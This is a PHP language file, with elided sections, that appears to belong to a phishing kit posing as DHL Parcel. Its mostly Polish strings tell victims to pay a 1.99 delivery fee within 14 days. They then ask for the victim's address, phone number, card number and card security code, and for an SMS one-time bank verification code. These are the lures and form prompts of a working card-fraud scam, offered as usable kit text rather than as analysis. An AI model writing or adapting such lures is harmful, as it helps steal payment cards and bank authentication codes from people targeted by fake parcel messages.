<?php
    ...
    $lang = array(
        ...
        'footer-widget-3-6' => [
            ...
            'pl' => 'Nauki przyrodnicze i Opieka zdrowotna',
        ],
        ...
        'parcel' => [
            ...
            'pl' => 'Ta przesyłka jest obsługiwana przez: <b> DHL Parcel</b>',
        ],

        'tracking' => [
            'en' => 'Tracking Code: DE47*********',
            'de' => 'Sendungsverfolgungsnummer: DE47*********',
            'es' => 'Código de Rastreo: DE47*********',
            'fr' => 'Code de suivi : DE47*********',
            'it' => 'Codice Tracking: DE47*********',
            'nl' => 'Traceringsnummer: DE47**********',
            'ar' => 'كود التتبع: DE47 *********',
            'dk' => 'Sporingskode: DE47**********',
            'cn' => '跟踪代码 : DE47**********',
            'ro' => 'Cod de urmărire: DE47*********',
            'pl' => 'Kod śledzenia: DE47*********',
        ],
        ...
        'important_message' => [
            ...
            'pl' => 'Aby zakończyć dostawę tak szybko, jak to możliwe, Potwierdź płatność (1.99'. $_SESSION['currency'].') klikając Dalej. Potwierdzenie Online musi zostać dokonane w ciągu najbliższych 14 dni, zanim wygaśnie.',
        ],
        ...
        'address_message' => [
            ...
            'pl' => 'Potrzebujemy Twojego adresu, aby mieć pewność, że osoby nieupoważnione nie mogą uzyskać dostępu do Twoich paczek, masz 10 dni roboczych od przybycia paczki do oddziału DHL po tym czasie paczka zostanie zwrócona nadawcy.',
        ],
        ...
        'phone_error' => [
            ...
            'pl' => 'Proszę podać poprawny numer telefonu',
        ],
        ...
        'zip_code_error' => [
            ...
            'pl' => 'Wprowadź prawidłowy kod pocztowy',
        ],
        ...
        'name_error' => [
            ...
            'pl' => 'Proszę podać poprawną nazwę',
        ],
        ...
        'one_error' => [
            ...
            'pl' => 'Wprowadź prawidłowy numer karty',
        ],
        ...
        'three_error' => [
            ...
            'pl' => 'Wprowadź prawidłowy kod zabezpieczający',
        ],
        ...
        'thanks' => [
            ...
            'pl' => 'Dziękujemy za wprowadzenie poprawki. Skontaktujemy się z tobą wkrótce.',
        ],
        ...
        'sms-title' => [
            ...
            'pl' => 'Proszę potwierdzić następujące płatności.',
        ],
        ...
        'sms-message' => [
            ...
            'pl' => 'Unikalne hasło zostało wysłane na podany poniżej numer telefonu komórkowego. Jeśli chcesz zmienić swój numer telefonu komórkowego, skontaktuj się z bankiem Modyfikuj go za pośrednictwem dostępnych kanałów (bankomat, sieć).',
        ],
        ...
        'sms-again' => [
            ...
            'pl' => 'Wprowadź kod weryfikacyjny otrzymany sms-em',
        ],
